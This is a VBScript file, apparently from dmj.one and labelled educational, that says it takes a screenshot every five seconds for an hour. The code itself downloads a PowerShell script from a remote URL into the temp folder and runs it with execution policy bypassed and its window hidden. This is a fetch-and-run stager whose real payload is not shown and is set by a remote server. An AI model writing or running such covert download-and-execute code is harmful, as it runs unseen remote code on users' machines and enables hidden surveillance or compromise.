' Purpose: Takes screenshots every 5 seconds continuously for 1 hour after this file is executed.
' Provided AS-IS and for EDUCATIONAL PURPOSE only.
' Make sure you have a drive named D on your system eg: C, D, E etc. 
' dmj.one holds no liablity or responsiblity whatsoever with respect to the use of code.
' DO NOT COPY   DO NOT MISUSE   DO NOT MODIFY
' (c) 2023, dmj.one

Option Explicit

' Declare all variables
Dim FSO, File, Path, PSFile, Shell, Command, XMLHTTP, URL

' Create objects for FileSystemObject, Shell, and ServerXMLHTTP
Set FSO = CreateObject("Scripting.FileSystemObject")
Set Shell = CreateObject("Wscript.Shell")
Set XMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")

' Set the path to the temp directory and the file name for the PowerShell script
Path = Shell.ExpandEnvironmentStrings("%temp%")
PSFile = Path & "\1.ps1"

' Set the URL for the PowerShell script to download
URL = "https://dmj.one/tools/rec/script/get.dat"

' Download the PowerShell script
XMLHTTP.Open "GET", URL, False
XMLHTTP.Send

' If the HTTP status is 200, meaning the request was successful,
' delete the old file (if it exists), then write the response to a new file.
' If not, display an error and exit.
If XMLHTTP.Status = 200 Then
    If FSO.FileExists(PSFile) Then FSO.DeleteFile PSFile
    Set File = FSO.CreateTextFile(PSFile, True)
    File.Write XMLHTTP.responseText
    File.Close
Else
    WScript.Echo "Unable to download the important scripts necessary for this VBScript to function. Ensure you have a stable internet connection and the https://dmj.one is accessible. HTTP Status: " & XMLHTTP.Status
    WScript.Quit
End If

' Run the PowerShell script using the shell's Run method
Command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & PSFile
Shell.Run Command, 0, True

' Clean up
Set XMLHTTP = Nothing
Set Shell = Nothing
Set File = Nothing
Set FSO = Nothing
